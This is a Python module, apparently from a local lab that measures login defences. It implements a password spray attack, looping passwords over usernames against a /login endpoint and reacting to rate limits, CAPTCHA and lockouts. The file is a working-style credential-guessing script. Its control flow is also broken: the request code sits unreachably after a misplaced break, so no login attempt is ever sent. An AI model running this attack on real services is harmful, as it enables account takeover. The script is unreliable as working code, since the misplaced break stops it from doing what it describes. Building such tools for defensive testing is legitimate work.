import requests
import time
from typing import List, Dict
from .metrics import AttackMetrics


class PasswordSprayAttack:
    def __init__(self, base_url="http://127.0.0.1:5000"):
        self.base_url = base_url
        self.session = requests.Session()

    def attack(
        self,
        usernames: List[str],
        password_list: List[str],
        metrics: AttackMetrics,
        delay: float = 0.5,
        max_time: float = None,
    ) -> List[Dict[str, str]]:
        """
        Password spray attack: tests each password on all users

        Args:
            usernames: list of usernames
            password_list: list of passwords to test
            metrics: AttackMetrics object for data collection
            delay: delay between each attempt (in seconds)
            max_time: maximum time in seconds (None = no time limit)

        Returns:
            List of found credentials as dicts with 'username' and 'password' keys
        """
        max_time_str = f"{max_time}s" if max_time else "unlimited"
        print(
            f"Starting Password Spray on {len(usernames)} users with {len(password_list)} passwords (max_time: {max_time_str})..."
        )

        found_credentials = []
        compromised = set()
        attempt_i = 0

        metrics.start()
        start_time = time.time()

        for pwd_idx, password in enumerate(password_list, 1):
            if max_time is not None:
                elapsed_time = time.time() - start_time
                if elapsed_time >= max_time:
                    print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
                    break
            print(f"   Testing password: '{password}' ({pwd_idx}/{len(password_list)})")

            time_limit_reached = False
            for user_idx, username in enumerate(usernames, 1):
                if username in compromised:
                    continue

                if max_time is not None:
                    elapsed_time = time.time() - start_time
                    if elapsed_time >= max_time:
                        print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
                        time_limit_reached = True
                        break
            
            if time_limit_reached:
                break

                attempt_i += 1
                attempt_start = time.time()

                try:
                    response = self.session.post(
                        f"{self.base_url}/login",
                        json={"username": username, "password": password},
                        timeout=10,
                    )

                    latency = int((time.time() - attempt_start) * 1000)

                    # Handle rate limiting
                    if response.status_code == 429:
                        print(f"Rate limited at attempt #{attempt_i}")
                        metrics.record_attempt(False, latency)
                        time.sleep(delay)
                        continue

                    # Handle captcha and lockout
                    if response.status_code == 403:
                        data = response.json()
                        if "locked" in data.get("error", ""):
                            print(f"Account locked: {username} at attempt #{attempt_i}")
                            compromised.add(
                                username
                            )  # Skip this user in future attempts
                        elif data.get("captcha_required"):
                            print(
                                f"CAPTCHA required: {username} at attempt #{attempt_i}"
                            )
                        metrics.record_attempt(False, latency)
                        time.sleep(delay)
                        continue

                    # Check for success
                    if response.status_code == 200:
                        data = response.json()
                        success = data.get("success", False)

                        if success:
                            found_credentials.append(
                                {"username": username, "password": password}
                            )
                            compromised.add(username)  # Mark as compromised
                            metrics.record_attempt(True, latency)
                            print(f"FOUND: {username}:{password}")
                        else:
                            metrics.record_attempt(False, latency)
                    else:
                        metrics.record_attempt(False, latency)

                    # Sample resources
                    if metrics.attempts % 10 == 0:
                        metrics.sample_resources()

                except Exception as e:
                    print(f"Error on {username}: {e}")
                    metrics.record_attempt(False, 0)

                # Delay between attempts
                if delay > 0:
                    time.sleep(delay)

        metrics.stop()

        print(
            f"Finished: {len(found_credentials)} credentials found out of {len(usernames)} accounts"
        )
        return found_credentials
